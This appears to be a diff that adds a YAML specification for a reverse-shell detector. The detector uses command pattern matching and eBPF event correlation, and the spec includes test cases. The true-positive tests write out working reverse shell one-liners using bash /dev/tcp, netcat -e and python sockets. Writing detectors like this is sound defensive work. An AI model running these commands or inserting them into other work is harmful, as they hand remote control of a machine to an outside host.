@@ -1,0 +1,91 @@
+kind: detector
+name: reverse_shell
+version: 1
+description: "Detects reverse shell patterns via command matching and eBPF connect+fd_redirect sequence correlation"
+
+context: |
+  Two detection methods:
+  1. Command pattern matching — 8 known reverse shell patterns in
+     shell.command_exec events: bash_dev_tcp, netcat_shell, python/perl/ruby/php
+     reverse shells, mkfifo_pipe, socat_shell.
+  2. eBPF sequence detection — correlates network.outbound_connect +
+     process.fd_redirect (dup2 stdin/stdout to socket) events by PID within
+     30s. Also detects bind shells: network.bind_listen + network.listen +
+     process.fd_redirect.
+
+  Always Critical severity — reverse/bind shells are the culmination of an
+  attack and require immediate response.
+
+  Key decisions:
+  - Command patterns are case-insensitive.
+  - eBPF sequence only fires on fd_redirect to fd 0-2 (stdin/stdout/stderr).
+  - PID-based correlation with 30s event expiry.
+  - Cooldown per command hash to prevent flooding.
+
+behavior:
+  does:
+    - "Fires Critical on /dev/tcp/ and /dev/udp/ patterns"
+    - "Fires Critical on nc/ncat/netcat with -e or -c flags"
+    - "Fires Critical on python+socket+connect patterns"
+    - "Fires Critical on perl+socket+inet, ruby+TCPSocket, php+fsockopen"
+    - "Fires Critical on mkfifo+nc and socat+exec+tcp"
+    - "Fires Critical on eBPF connect+fd_redirect sequence"
+    - "Detects bind shells via bind_listen+listen+fd_redirect"
+  does_not:
+    - "Alert on normal network connections without fd_redirect"
+    - "Alert on fd_redirect to fd > 2 (not stdio redirection)"
+    - "Alert on commands that partially match but lack key components"
+    - "Re-alert within cooldown"
+
+config:
+  cooldown_secs: 300
+
+dependencies: []
+
+test_cases:
+  true_positives:
+    - description: "Bash /dev/tcp reverse shell"
+      input:
+        kind: "shell.command_exec"
+        command: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+      expected:
+        alert: true
+        severity: "critical"
+
+    - description: "Netcat reverse shell"
+      input:
+        kind: "shell.command_exec"
+        command: "nc -e /bin/bash 1.2.3.4 4444"
+      expected:
+        alert: true
+        severity: "critical"
+
+    - description: "Python reverse shell"
+      input:
+        kind: "shell.command_exec"
+        command: "python3 -c 'import socket; s=socket.socket(); s.connect((\"1.2.3.4\",4444))'"
+      expected:
+        alert: true
+        severity: "critical"
+
+  true_negatives:
+    - description: "Normal netcat usage without -e"
+      input:
+        kind: "shell.command_exec"
+        command: "nc -z 1.2.3.4 80"
+      expected:
+        alert: false
+        reason: "No -e or -c flag"
+
+    - description: "Normal outbound connection (no fd_redirect)"
+      input:
+        kind: "network.outbound_connect"
+        comm: "curl"
+        dst_ip: "1.2.3.4"
+        dst_port: 443
+      expected:
+        alert: false
+        reason: "No fd_redirect event correlated"
+
+history:
+  - "2026-04-02: initial spec from source code analysis"
